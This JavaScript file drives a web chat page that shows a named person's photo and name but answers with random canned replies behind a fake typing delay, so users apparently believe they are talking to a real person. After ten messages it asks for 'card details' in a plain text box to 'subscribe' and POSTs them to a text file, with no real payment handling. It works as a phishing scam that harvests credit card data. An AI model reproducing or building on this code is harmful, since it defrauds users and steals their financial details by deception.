document.addEventListener('DOMContentLoaded', () => {
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('chat-input');
    const sendButton = document.getElementById('send-button');
    const chatDp = document.getElementById('chat-dp');
    const chatName = document.getElementById('chat-name');
    const urlParams = new URLSearchParams(window.location.search);
    const person = urlParams.get('person');
    
    const images = {
        hansi: 'images/hansi.jpeg',
        sulakshi: 'images/sulakshi.jpg',
        default: 'images/default.jpg'
    };

    const names = {
        hansi: 'Hansi',
        sulakshi: 'Sulakshi',
        default: 'Default'
    };

    if (person) {
        chatDp.src = images[person] || images['default'];
        chatName.innerText = names[person] || names['default'];
    }

    const replies = [
        "Hi there! How can I help you?",
        "I'm not sure I understand. Can you clarify?",
        "That's interesting. Tell me more!",
        "Sorry, I don't have an answer to that.",
        "Let me think about it..."
    ];

    let messageCount = 0;

    sendButton.addEventListener('click', sendMessage);
    chatInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            sendMessage();
        }
    });

    function sendMessage() {
        const userMessage = chatInput.value;
        if (userMessage.trim() === '') return;

        appendMessage(userMessage, 'user');
        chatInput.value = '';
        messageCount++;

        if (messageCount >= 10) {
            showSubscriptionPrompt();
        } else {
            showTypingAnimation().then(() => {
                const randomReply = replies[Math.floor(Math.random() * replies.length)];
                appendMessage(randomReply, 'bot');
            });
        }
    }

    function appendMessage(message, sender) {
        const messageElem = document.createElement('div');
        messageElem.classList.add('message', sender);
        messageElem.innerText = message;
        chatBox.appendChild(messageElem);
        chatBox.scrollTop = chatBox.scrollHeight;
    }

    function showTypingAnimation() {
        return new Promise((resolve) => {
            const typingElem = document.createElement('div');
            typingElem.classList.add('message', 'bot', 'typing-indicator');
            typingElem.innerHTML = `
                <span></span>
                <span></span>
                <span></span>
            `;
            chatBox.appendChild(typingElem);
            chatBox.scrollTop = chatBox.scrollHeight;

            const typingTime = Math.random() * (5000 - 1000) + 1000;
            setTimeout(() => {
                chatBox.removeChild(typingElem);
                resolve();
            }, typingTime);
        });
    }

    function showSubscriptionPrompt() {
        const promptElem = document.createElement('div');
        promptElem.classList.add('message', 'bot');
        promptElem.innerHTML = `
            You have reached the message limit. Please subscribe to continue chatting.
            <br>
            <input type="text" id="card-details" placeholder="Enter your card details">
            <button id="subscribe-button">Subscribe</button>
        `;
        chatBox.appendChild(promptElem);
        chatBox.scrollTop = chatBox.scrollHeight;

        document.getElementById('subscribe-button').addEventListener('click', () => {
            const cardDetails = document.getElementById('card-details').value;
            saveCardDetails(cardDetails);
        });
    }

    function saveCardDetails(details) {
        fetch('data/cards.txt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cardDetails: details })
        }).then(response => {
            if (response.ok) {
                console.log('Card details saved successfully.');
            } else {
                console.error('Failed to save card details.');
            }
        });
    }
});
